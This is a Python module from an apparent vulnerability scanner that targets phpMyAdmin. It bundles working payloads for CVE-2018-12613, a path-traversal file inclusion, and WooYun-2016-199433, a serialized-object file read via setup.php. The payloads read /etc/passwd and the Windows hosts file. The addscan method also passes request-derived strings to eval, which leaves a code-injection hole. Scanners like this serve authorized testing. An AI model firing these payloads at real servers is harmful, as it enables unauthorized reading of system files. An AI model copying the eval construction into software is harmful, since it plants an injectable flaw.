#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
PhpMyAdmin 是一个用 PHP 编写的免费软件工具, 旨在通过 Web 处理 MySQL 的管理
    phpMyadmin扫描类: 
        1. phpmyadmin 4.8.1 远程文件包含
            CVE-2018-12613
                Payload: https://vulhub.org/#/environments/phpmyadmin/CVE-2018-12613/

        2. Phpmyadmin Scripts/setup.php 反序列化
            WooYun-2016-199433
                Payload: https://vulhub.org/#/environments/phpmyadmin/WooYun-2016-199433/

file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.thread import thread
from payloads.phpMyadmin.cve_2018_12613 import cve_2018_12613_scan
from payloads.phpMyadmin.wooyun_2016_199433 import wooyun_2016_199433_scan

class phpMyadmin():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'phpMyadmin'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md
        
        self.cve_2018_12613_payloads = [
            {
                'path': 'index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd',
                'data': ''
            },
            {
                'path': 'index.php?target=db_sql.php%253f/../../../../../../../../C:/Windows/System32/drivers/etc/hosts',
                'data': ''
            },
            {
                'path': 'index.php?target=db_sql.php%253f/../../../../../../../../C:\Windows\System32\drivers\etc\hosts',
                'data': ''
            },
        ]
        
        self.wooyun_2016_199433_payloads = [
            {
                'path': 'scripts/setup.php',
                'data': 'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}'
            },
            {
                'path': 'scripts/setup.php',
                'data': 'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"C:/Windows/System32/drivers/etc/hosts";}'
            },
            {
                'path': 'scripts/setup.php',
                'data': 'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"C:\Windows\System32\drivers\etc\hosts";}'
            },
            {
                'path': 'setup.php',
                'data': 'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}'
            },
            {
                'path': 'setup.php',
                'data': 'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"C:/Windows/System32/drivers/etc/hosts";}'
            },
            {
                'path': 'setup.php',
                'data': 'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"C:\Windows\System32\drivers\etc\hosts";}'
            },
        ]

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2018_12613_scan, url=url),
            thread(target=self.wooyun_2016_199433_scan, url=url)
        ]

phpMyadmin.cve_2018_12613_scan = cve_2018_12613_scan
phpMyadmin.wooyun_2016_199433_scan = wooyun_2016_199433_scan

phpmyadmin = phpMyadmin()
